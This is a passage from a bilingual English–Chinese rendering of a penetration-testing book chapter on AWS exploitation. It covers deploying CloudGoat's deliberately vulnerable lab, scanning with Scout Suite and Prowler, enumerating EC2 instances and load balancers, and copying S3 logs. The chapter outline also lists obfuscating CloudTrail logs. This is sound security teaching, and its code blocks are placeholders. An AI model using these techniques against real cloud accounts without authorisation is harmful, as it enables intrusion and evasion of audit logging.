- en: '8'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '8'
- en: Cloud Security Exploitation
  id: totrans-1
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 云安全漏洞利用
- en: Cloud adoption has significantly changed the way organizations collect, process,
    and store the data of end users. Some businesses automatically assume that their
    cloud providers will take care of their cybersecurity, but every cloud consumer,
    be it an individual or a business, must be aware that it’s a shared responsibility.
    Having said that, the majority of the time, when testers successfully get access
    to an internal network, they think they are almost done with the test, assuming
    they can then proceed to compromise the network or enterprise.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 云采用显著改变了组织收集、处理和存储最终用户数据的方式。一些企业自动认为他们的云服务提供商会负责其网络安全，但每个云消费者，无论是个人还是企业，都必须意识到这是一个共享责任。话虽如此，大多数情况下，当测试人员成功获得内部网络访问权限时，他们认为测试几乎完成，假设他们可以继续入侵网络或企业。
- en: In this chapter, we will explore different types of attacks that pentesters
    can leverage if they gain a foothold into a cloud environment. In particular,
    we will explore AWS and identify multiple processes for circumventing security
    controls and demonstrate this using the tools in Kali Linux.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将探讨渗透测试人员如果进入云环境，可以利用的不同类型的攻击。特别是，我们将探讨 AWS，并识别多种绕过安全控制的过程，并使用 Kali Linux
    中的工具演示这一过程。
- en: 'By the end of this chapter, you will have learned how to attack misconfigured
    cloud services by covering the following topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 本章结束时，你将学习如何通过以下主题攻击配置错误的云服务：
- en: Basic principles of cloud services
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 云服务的基本原则
- en: Vulnerability scanning and application exploitation in EC2 instances
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: EC2 实例中的漏洞扫描与应用利用
- en: Reaching AWS IAM keys
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 获取 AWS IAM 密钥
- en: Testing for S3 bucket misconfiguration
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 测试 S3 桶配置错误
- en: Exploiting security permission flaws
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用安全权限漏洞
- en: Obfuscating CloudTrail logs
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 混淆 CloudTrail 日志
- en: We will explore the basic principles of cloud services and different deployment
    models.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将探讨云服务的基本原则和不同的部署模型。
- en: Introduction to cloud services
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 云服务介绍
- en: 'Cloud computing, in general, is the on-demand availability of computing resource
    services, particularly storage and computing power for consumers. The main principles
    of cloud computing are on-demand, self-service broad network access, multi-tenancy,
    resource pooling, elasticity, scalability, and measured services. *Table 8.1*
    provides details on the four deployment models cloud service providers offer.
    If any of these deployment models are successfully exploited and communication
    is established, then it provides persistent access to achieve the objective of
    the pentest:'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 云计算通常是指计算资源服务的按需提供，特别是为消费者提供的存储和计算能力。云计算的主要原则包括按需、 自助服务、广泛的网络访问、多租户、资源池化、弹性、可扩展性和计量服务。*表
    8.1* 提供了云服务提供商提供的四种部署模型的详细信息。如果这些部署模型中的任何一种被成功利用并建立了通信连接，那么它将提供持续访问，从而实现渗透测试的目标：
- en: '| **Deployment Model** | **Description** |'
  id: totrans-14
  prefs: []
  type: TYPE_TB
  zh: '| **部署模型** | **描述** |'
- en: '| Private Cloud | Cloud infrastructure is exclusive and provisioned only for
    a specific organization. Similar to traditional data centers but hosted on the
    cloud. |'
  id: totrans-15
  prefs: []
  type: TYPE_TB
  zh: '| 私有云 | 仅为特定组织提供的独占云基础设施。类似于传统的数据中心，但托管在云上。 |'
- en: '| Community Cloud | This is a cloud infrastructure that is shared between the
    specific community of consumers from organizations that have a shared interest.
    |'
  id: totrans-16
  prefs: []
  type: TYPE_TB
  zh: '| 社区云 | 这是一个云基础设施，在具有共同兴趣的组织消费者之间共享。 |'
- en: '| Public Cloud | Cloud infrastructure that is provisioned for the general end
    user public. |'
  id: totrans-17
  prefs: []
  type: TYPE_TB
  zh: '| 公有云 | 为广大终端用户公众提供的云基础设施。 |'
- en: '| Hybrid Cloud | Cloud infrastructure that combines any two of the above models,
    usually a combination of private and public cloud, on-premises and private cloud,
    or on-premises and public cloud. |'
  id: totrans-18
  prefs: []
  type: TYPE_TB
  zh: '| 混合云 | 结合上述任意两种模型的云基础设施，通常是私有云与公有云、内部部署与私有云，或内部部署与公有云的组合。 |'
- en: 'Table 8.1: Cloud deployment models'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 表 8.1：云部署模型
- en: 'Before working out what type of testing you might have to perform on any given
    client environment, it is important to understand the following fundamental cloud
    service models:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 在确定你可能需要在任何特定客户环境中执行的测试类型之前，理解以下基本的云服务模型非常重要：
- en: '| **Service Model** | **Description** |'
  id: totrans-21
  prefs: []
  type: TYPE_TB
  zh: '| **服务模型** | **描述** |'
- en: '| Software as a Service | In this service, the cloud vendor provides software
    to organizations whereby they pay as they go. Some examples of SaaS cloud service
    providers include Dropbox, G Suite, Microsoft Office 365, Slack, and Citrix Content
    Collaboration. |'
  id: totrans-22
  prefs: []
  type: TYPE_TB
  zh: '| 软件即服务 | 在此服务中，云服务商提供软件给组织，组织按需付费。SaaS 云服务提供商的示例包括 Dropbox、G Suite、Microsoft
    Office 365、Slack 和 Citrix Content Collaboration。 |'
- en: '| Platform as a Service | In this service, the cloud vendor provides both the
    hardware and software to the organizations. Some examples include AWS Elastic
    Beanstalk, Heroku, Windows Azure (mostly used as PaaS), Force.com, OpenShift,
    and Apache Stratos. |'
  id: totrans-23
  prefs: []
  type: TYPE_TB
  zh: '| 平台即服务 | 在此服务中，云服务商提供硬件和软件给组织。常见的示例包括 AWS Elastic Beanstalk、Heroku、Windows
    Azure（主要作为 PaaS 使用）、Force.com、OpenShift 和 Apache Stratos。 |'
- en: '| Infrastructure as a Service | In this service, mainly storage, networking,
    and virtualization are provided to organizations, who pay as they go. Examples
    include AWS EC2, Rackspace, **Google** **Compute Engine** (**GCE**), Digital Ocean,
    etc. |'
  id: totrans-24
  prefs: []
  type: TYPE_TB
  zh: '| 基础设施即服务 | 在此服务中，主要提供存储、网络和虚拟化给组织，组织按需付费。示例包括 AWS EC2、Rackspace、**Google**
    **Compute Engine**（**GCE**）、Digital Ocean 等。 |'
- en: 'Table 8.2: Cloud service models'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 表 8.2：云服务模型
- en: '*Figure 8.1* depicts how the security responsibility changes based on the service
    models:'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 8.1* 展示了如何根据服务模型的不同，安全责任发生变化：'
- en: '![](../Images/B17765_08_01.png)'
  id: totrans-27
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_01.png)'
- en: 'Figure 8.1: Cloud service model and responsibilities'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.1：云服务模型与责任
- en: Having understood the basics, we will now be setting up our AWS lab to configure
    deliberately vulnerable instances using the CloudGoat AWS deployment tool that
    we installed in *Chapter 1*, *Goal-Based Penetration Testing*. Be aware that usage
    of AWS services will incur costs, even if CloudGoat is left unused after deploying
    the vulnerable instances. Additionally, these instances will open up your cloud
    infrastructure to a variety of attacks.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 理解了基本概念后，我们现在将设置我们的 AWS 实验室，通过我们在*第 1 章*《基于目标的渗透测试》中安装的 CloudGoat AWS 部署工具来配置故意存在漏洞的实例。请注意，即使在部署了存在漏洞的实例后不使用
    CloudGoat，使用 AWS 服务仍会产生费用。此外，这些实例将使您的云基础设施暴露于各种攻击。
- en: Scenarios on accessing these cloud services would even begin from the initial
    reconnaissance phase wherein attackers explore all the GitHub repositories, pastebin,
    or any data dumping sites of a target organization and could potentially obtain
    the access key and the secret.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 访问这些云服务的场景甚至可能从初步的侦察阶段开始，在该阶段攻击者探索目标组织的所有 GitHub 仓库、pastebin 或任何数据转储网站，可能会获取访问密钥和密钥对。
- en: 'The following are the CloudGoat options available to configure and practice
    AWS-specific attacks. To understand the options, testers can run a Docker image
    by entering `docker run –it rhinosecuritylabs/Cloudgoat:latest` in the terminal,
    which should lead us to the CloudGoat shell, where we run `./cloudgoat help`,
    which should provide us with the following five options shown in *Figure 8.2*:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是可用来配置和练习 AWS 特定攻击的 CloudGoat 选项。为了理解这些选项，测试人员可以在终端输入`docker run –it rhinosecuritylabs/Cloudgoat:latest`来运行
    Docker 镜像，这将引导我们进入 CloudGoat shell，在这里我们运行`./cloudgoat help`，这将为我们提供如下五个选项，如*图
    8.2*所示：
- en: '![](../Images/B17765_08_02.png)'
  id: totrans-32
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_02.png)'
- en: 'Figure 8.2: Running CloudGoat from the Docker image'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.2：从 Docker 镜像运行 CloudGoat
- en: 'Testers who receive any error messages relating to Terraform, such as `OSError:
    [Errno 8] Exec format error: "terraform" or "Terraform not found"`, can resolve
    this issue by following these steps to replace the default Terraform with the
    latest version:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: '收到与 Terraform 相关的错误信息，如`OSError: [Errno 8] Exec format error: "terraform" 或
    "Terraform not found"`的测试人员，可以按照以下步骤，通过替换默认的 Terraform 为最新版本来解决此问题：'
- en: Run `wget https://releases.hashicorp.com/terraform/1.0.10/terraform_1.0.10_linux_amd64.zip`
  id: totrans-35
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 运行`wget https://releases.hashicorp.com/terraform/1.0.10/terraform_1.0.10_linux_amd64.zip`
- en: Unzip `terraform_1.0.10_linux_amd64.zip`
  id: totrans-36
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 解压`terraform_1.0.10_linux_amd64.zip`
- en: Run `mv /usr/bin/terraform terraform_old`
  id: totrans-37
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 运行`mv /usr/bin/terraform terraform_old`
- en: Run `mv terraform /usr/bin/`
  id: totrans-38
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 运行`mv terraform /usr/bin/`
- en: 'The following shows details of the first four options:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 以下展示前四个选项的详细信息：
- en: '`config` – This option allows us to manage different aspects of our CloudGoat
    installation, especially the IP whitelist and our default AWS profile:'
  id: totrans-40
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`config` – 此选项允许我们管理 CloudGoat 安装的不同方面，尤其是 IP 白名单和默认的 AWS 配置文件：'
- en: '`whitelist` – It is always recommended that testers whitelist the IP address
    that they will be conducting the testing from due to the potentially vulnerable
    resources that are deployed within the AWS infrastructure. This command stores
    the IP address or IP address ranges within the `./whitelist.txt` file within the
    base project directory. Additionally, you can add the `–auto` argument and this
    tool will automatically make a network request. Use `curl` `ifconfig.co` to find
    your IP address and then create the whitelist file with the result.'
  id: totrans-41
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`whitelist` – 建议测试人员始终将将要进行测试的 IP 地址列入白名单，因为在 AWS 基础设施中部署的资源可能存在漏洞。此命令将 IP
    地址或 IP 地址范围存储在项目基础目录中的 `./whitelist.txt` 文件中。此外，您可以添加 `--auto` 参数，此工具将自动进行网络请求。使用
    `curl ifconfig.co` 查找您的 IP 地址，然后使用结果创建白名单文件。'
- en: '`profile` – CloudGoat will need the AWS profile to be manually configured by
    default. Running this command will prompt testers to enter profile details such
    as the AWS access key and secret and they will be stored in the `config.yml` file
    within the project directory. Attackers can choose to create their own `config.yml`
    file.'
  id: totrans-42
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`profile` – CloudGoat 默认需要手动配置 AWS 配置文件。运行此命令将提示测试人员输入配置文件详细信息，如 AWS 访问密钥和秘密密钥，并将它们存储在项目目录中的
    `config.yml` 文件中。攻击者可以选择创建自己的 `config.yml` 文件。'
- en: '`create` – This option deploys a scenario to the AWS account. If you deploy
    a scenario twice, CloudGoat will destroy the existing one and create a new scenario.'
  id: totrans-43
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`create` – 此选项将场景部署到 AWS 帐户。如果部署场景两次，CloudGoat 将销毁现有场景并创建新场景。'
- en: '`list` – This will show all the deployed scenarios, undeployed scenarios, and
    more information about a specific deployed scenario.'
  id: totrans-44
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`list` – 这将显示所有已部署的场景、未部署的场景以及有关特定已部署场景的更多信息。'
- en: '`destroy` – This will shut down and delete all the resources that were created
    by CloudGoat.'
  id: totrans-45
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`destroy` – 这将关闭并删除 CloudGoat 创建的所有资源。'
- en: 'To configure CloudGoat to a specific profile, run `./cloudgoat.py config profile
    <profilename>` in the terminal:'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 要将 CloudGoat 配置到特定配置文件，请在终端中运行 `./cloudgoat.py config profile <profilename>`：
- en: '[PRE0]'
  id: totrans-47
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: 'It is very important that we configure the AWS resources as accessible only
    by the IP that you will be connecting from:'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 非常重要的一点是，我们需要将 AWS 资源配置为仅允许来自您连接的 IP 访问：
- en: '[PRE1]'
  id: totrans-49
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'For our next section, we will deploy a vulnerable web application to perform
    application-specific exploitation within AWS. This can be achieved by running
    `./cloudgoat create rce_web_app --profile masteringkali`. This should begin the
    deployment of the cloud resources by CloudGoat to your AWS account and once the
    deployment is complete, you should be able to see the confirmation with the cloud
    access details, as shown in *Figure 8.3*:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一部分中，我们将部署一个易受攻击的 Web 应用程序，以在 AWS 中执行特定应用程序的利用。通过在终端中运行 `./cloudgoat create
    rce_web_app --profile masteringkali` 来实现。这将开始 CloudGoat 向您的 AWS 帐户部署云资源的过程，部署完成后，您应该能够看到包含云访问详细信息的确认信息，如
    *图 8.3* 所示：
- en: '[PRE2]'
  id: totrans-51
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: '![](../Images/B17765_08_03.png)'
  id: totrans-52
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_03.png)'
- en: 'Figure 8.3: Deploying rce_web_app using CloudGoat and our AWS profile'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: '图 8.3: 使用 CloudGoat 和我们的 AWS 配置文件部署 rce_web_app'
- en: 'Once the deployment of the web application and the supporting resources is
    complete, testers should be presented with *Figure 8.4* as successful completion
    of the deployment:'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 在完成 Web 应用程序及其支持资源的部署后，测试人员应该看到*图 8.4*，表示部署成功完成：
- en: '![](../Images/B17765_08_04.png)'
  id: totrans-55
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_04.png)'
- en: 'Figure 8.4: Successful deployment of the vulnerable setup'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: '图 8.4: 漏洞设置成功部署'
- en: Testers can utilize the access key and secret key generated by CloudGoat to
    perform the penetration test on the deployed scenario. As a traditional step,
    testers can utilize vulnerability scanners such as Scout Suite or Prowler.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 测试人员可以利用 CloudGoat 生成的访问密钥和秘密密钥对部署的场景进行渗透测试。作为传统步骤，测试人员可以利用漏洞扫描工具如 Scout Suite
    或 Prowler。
- en: Vulnerability scanning and application exploitation in an EC2 instance
  id: totrans-58
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在 EC2 实例中进行漏洞扫描和应用程序利用
- en: The first step is to equip our Kali Linux to install the AWS client by running
    `sudo apt install awscli` from the terminal, and then we can leverage the tools
    to understand what permissions we have with the current API and secret keys.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 第一步是通过在终端中运行 `sudo apt install awscli` 为我们的 Kali Linux 配备 AWS 客户端，然后我们可以利用工具了解当前
    API 和秘密密钥的权限。
- en: Configure the AWS profile by running `sudo aws configure --profile <profilename>`
    in the terminal.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 通过在终端中运行 `sudo aws configure --profile <profilename>` 来配置 AWS 配置文件。
- en: 'In this case, we will configure the two profiles within our Kali Linux:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，我们将在 Kali Linux 中配置这两个配置文件：
- en: For demonstration purposes, we will change the suggested `Lara` profile name
    (see *Figure 8.4*) to **RCE** (**Remote Code Execution**) with the access key
    and secret key.
  id: totrans-62
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了演示目的，我们将更改建议的 `Lara` 配置文件名（见*图8.4*），改为**RCE**（**远程代码执行**），并使用访问密钥和秘密密钥。
- en: We will create a `mcduck` profile as suggested by CloudGoat with the keys generated
    during the CloudGoat scenario deployment.
  id: totrans-63
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将创建一个由 CloudGoat 推荐的 `mcduck` 配置文件，并使用在 CloudGoat 场景部署过程中生成的密钥。
- en: '[PRE3]'
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'To confirm that our profiles are working, we can list down the **S3** (which
    is Amazon’s **Simple Storage Service**) buckets that these profiles can access
    by running the following command and testers should be able to see them as in
    *Figure 8.5*:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 为了确认我们的配置文件是否正常工作，我们可以列出这些配置文件能够访问的**S3**（即亚马逊的**简单存储服务**）存储桶，通过运行以下命令，测试人员应该能够看到它们，正如*图8.5*所示：
- en: '[PRE4]'
  id: totrans-66
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: '![](../Images/B17765_08_05.png)'
  id: totrans-67
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_05.png)'
- en: 'Figure 8.5: Configuring the AWS profile within Kali Linux'
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.5：在 Kali Linux 中配置 AWS 配置文件
- en: Attackers can leverage automated tools such as Scout Suite and Prowler to understand
    misconfigurations/excessive permissions quickly.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以利用自动化工具，如 Scout Suite 和 Prowler，快速了解错误配置/过度权限。
- en: 'Scout Suite is an open-source cloud security auditing tool that works on multi-cloud
    environments such as AWS, GCP, and Azure. Additionally, this tool is in the alpha
    phase for Oracle and Alibaba Cloud. This tool is written in Python and utilizes
    exposed APIs to gather configuration details to provide the attack surface of
    a given cloud environment. The project is actively maintained by NCC Group. There
    is a commercial service to this tool as well. Scout can be installed to Kali Linux
    by cloning the repository locally and installing the dependencies by running the
    following commands in the terminal:'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: Scout Suite 是一个开源云安全审计工具，支持 AWS、GCP 和 Azure 等多云环境。此外，该工具目前正处于针对 Oracle 和阿里云的
    alpha 版本阶段。此工具使用 Python 编写，利用公开的 API 收集配置信息，以提供给定云环境的攻击面。该项目由 NCC Group 积极维护，同时该工具也提供商业服务。可以通过克隆仓库并运行以下命令安装
    Scout 至 Kali Linux：
- en: '[PRE5]'
  id: totrans-71
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: '*Figure 8.6* shows the launch of the Scout security auditing tool on AWS using
    a specific profile.'
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: '*图8.6*展示了在 AWS 上使用特定配置文件启动 Scout 安全审计工具的过程。'
- en: '![](../Images/B17765_08_06.png)'
  id: totrans-73
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_06.png)'
- en: 'Figure 8.6: Running Scout on AWS using our profile'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.6：在 AWS 上使用我们的配置文件运行 Scout
- en: 'Once the scanning is complete, Scout creates an HTML report within the same
    folder as the tool was run. Testers will be able to list the misconfigurations/vulnerabilities
    relating to the profile that was scanned. *Figure 8.7* depicts the report output:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 扫描完成后，Scout 会在与运行工具相同的文件夹内创建一个 HTML 报告。测试人员将能够列出与所扫描配置文件相关的错误配置/漏洞。*图8.7*展示了报告输出：
- en: '![](../Images/B17765_08_07.png)'
  id: totrans-76
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_07.png)'
- en: 'Figure 8.7: Output report of Scout'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.7：Scout 输出报告
- en: 'Further subsections detail AWS features/options and descriptions that will
    help pentesters understand what they should focus on, as shown in *Figure 8.8*:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 后续小节详细描述了 AWS 的功能/选项和说明，帮助渗透测试人员理解他们应该关注的内容，如*图8.8*所示：
- en: '![](../Images/B17765_08_08.png)'
  id: totrans-79
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_08.png)'
- en: 'Figure 8.8: Detailed IAM section within the Scout report'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.8：Scout 报告中的详细 IAM 部分
- en: '**Prowler** is another security tool specifically designed to perform checks
    on AWS that covers security best practices across all AWS regions and groups.
    The tool also has a prebuilt mapping to various benchmarks (CIS, GDPR, HIPAA,
    PCI-DSS, ISO-27001, FFIEC, SOC2, and others). This tool is written in a combination
    of multiple Bash scripts that perform local checks with the existing privileges
    of the profile that is configured. This can be installed on Kali Linux by cloning
    the repository by running the following commands in the terminal:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: '**Prowler** 是另一款专门设计用于执行 AWS 检查的安全工具，涵盖了所有 AWS 区域和组的安全最佳实践。该工具还预构建了与各种基准（CIS、GDPR、HIPAA、PCI-DSS、ISO-27001、FFIEC、SOC2
    等）的映射。此工具结合多种 Bash 脚本编写，利用已配置的配置文件的现有权限执行本地检查。可以通过克隆仓库并在终端运行以下命令将其安装到 Kali Linux
    上：'
- en: '[PRE6]'
  id: totrans-82
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'The latest version of Prowler is v2.5.0\. Testers can verify the scanning activity
    by simply running `sudo ./prowler –p <profile name>` as shown in *Figure 8.9*:'
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 最新版本的 Prowler 是 v2.5.0。测试人员可以通过简单地运行`sudo ./prowler –p <profile name>`来验证扫描活动，如*图8.9*所示：
- en: '![Text  Description automatically generated](../Images/B17765_08_09.png)'
  id: totrans-84
  prefs: []
  type: TYPE_IMG
  zh: '![文本描述自动生成](../Images/B17765_08_09.png)'
- en: 'Figure 8.9: Running the Prowler cloud security tool from Kali Linux'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.9：从 Kali Linux 运行 Prowler 云安全工具
- en: Attackers can leverage the AWS Command Line Interface cheat sheet at [https://www.bluematador.com/learn/aws-cli-cheatsheet](https://www.bluematador.com/learn/aws-cli-cheatsheet)
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以利用AWS命令行界面备忘单，链接地址为 [https://www.bluematador.com/learn/aws-cli-cheatsheet](https://www.bluematador.com/learn/aws-cli-cheatsheet)
- en: 'Let’s go ahead and identify the list of instances that are available to the
    profile RCE that we created by running the following command in the terminal:'
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们继续识别配置文件 RCE 中可用的实例列表，方法是在终端运行以下命令：
- en: '[PRE7]'
  id: totrans-88
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'This should provide the instance details as shown in *Figure 8.10*, with the
    public and internal IP details:'
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 这应该提供如*图 8.10*所示的实例详细信息，包括公共和内部 IP 详情：
- en: '![Text  Description automatically generated](../Images/B17765_08_10.png)'
  id: totrans-90
  prefs: []
  type: TYPE_IMG
  zh: '![文本 描述自动生成](../Images/B17765_08_10.png)'
- en: 'Figure 8.10: Detailed IAM section within the Scout report'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.10：Scout 报告中的详细 IAM 部分
- en: In the details of the instance (the full output is not displayed in *Figure
    8.10*), we can see that the public IP is configured to specific security groups.
    If you locate `"RootDeviceType"` from the output of the above command it will
    be pointing to `"ebs"`, which means the IP address is not publicly accessible.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在实例的详细信息中（完整输出未显示在*图 8.10*中），我们可以看到公共 IP 被配置到特定的安全组。如果你从上述命令的输出中找到 `"RootDeviceType"`，它会指向
    `"ebs"`，这意味着该 IP 地址不可公开访问。
- en: 'The next step is to find out what load balancers are configured to this device
    by running `sudo aws elbv2 describe-load-balancers –-profile RCE` in the Kali
    Linux terminal:'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 下一步是通过在 Kali Linux 终端运行 `sudo aws elbv2 describe-load-balancers –-profile RCE`
    来找出哪些负载均衡器配置了该设备：
- en: '[PRE8]'
  id: totrans-94
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'The output of the EC2 load balancers comes back with the specific DNS name
    as shown in *Figure 8.11*:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: EC2 负载均衡器的输出返回了特定的 DNS 名称，如*图 8.11*所示：
- en: '![Text  Description automatically generated](../Images/B17765_08_11.png)'
  id: totrans-96
  prefs: []
  type: TYPE_IMG
  zh: '![文本 描述自动生成](../Images/B17765_08_11.png)'
- en: 'Figure 8.11: Extracting elastic load balancer details'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.11：提取弹性负载均衡器的详细信息
- en: 'Finally, we are now able to reach the load balancer as shown in *Figure 8.12*.
    The next step is to identify what else is available:'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们现在能够访问负载均衡器，如*图 8.12*所示。下一步是识别其他可用资源：
- en: '![A screenshot of a computer  Description automatically generated with medium
    confidence](../Images/B17765_08_12.png)'
  id: totrans-99
  prefs: []
  type: TYPE_IMG
  zh: '![计算机截图 描述自动生成，信心中等](../Images/B17765_08_12.png)'
- en: 'Figure 8.12: Accessing the elastic load balancer public DNS'
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.12：访问弹性负载均衡器的公共 DNS
- en: 'Next, we will find our profile’s permission within the S3 bucket by running
    `sudo aws s3 ls –profile RCE` in the terminal. This profile has access only to
    the logs folder within the S3 bucket as shown in *Figure 8.13*:'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将在终端运行 `sudo aws s3 ls –profile RCE` 来查找 S3 桶中我们配置文件的权限。此配置文件仅对 S3 桶中的日志文件夹具有访问权限，如*图
    8.13*所示：
- en: '![](../Images/B17765_08_13.png)'
  id: totrans-102
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_08_13.png)'
- en: 'Figure 8.13: Accessing the S3 buckets with the RCE profile'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.13：使用 RCE 配置文件访问 S3 桶
- en: 'We explore the logs folder by listing all the directories within the S3 bucket
    by running `sudo aws s3 ls s3://<bucket>/pathofthefile --profile –-region us-east-1`
    and copy the file by running the following command in the terminal as shown in
    *Figure 8.14*:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过运行 `sudo aws s3 ls s3://<bucket>/pathofthefile --profile –-region us-east-1`
    列出 S3 桶中的所有目录，并通过运行终端中的以下命令复制文件，如*图 8.14*所示：
- en: '[PRE9]'
  id: totrans-105
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: '![Background pattern  Description automatically generated](../Images/B17765_08_14.png)'
  id: totrans-106
  prefs: []
  type: TYPE_IMG
  zh: '![背景图案 描述自动生成](../Images/B17765_08_14.png)'
- en: 'Figure 8.14: Copying the log file from the S3 bucket'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.14：从 S3 桶复制日志文件
- en: 'Analyzing the log file, we find there are multiple requests that have `200`
    as the HTTP response from the server and have a unique HTML associated with it,
    as shown in *Figure 8.15*:'
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 分析日志文件后，我们发现有多个请求的 HTTP 响应码是 `200`，并且每个请求都有一个唯一的 HTML 文件与之关联，如*图 8.15*所示：
- en: '![Background pattern  Description automatically generated](../Images/B17765_08_15.png)'
  id: totrans-109
  prefs: []
  type: TYPE_IMG
  zh: '![背景图案 描述自动生成](../Images/B17765_08_15.png)'
- en: 'Figure 8.15: Analyzing the log file and identifying the URI'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.15：分析日志文件并识别 URI
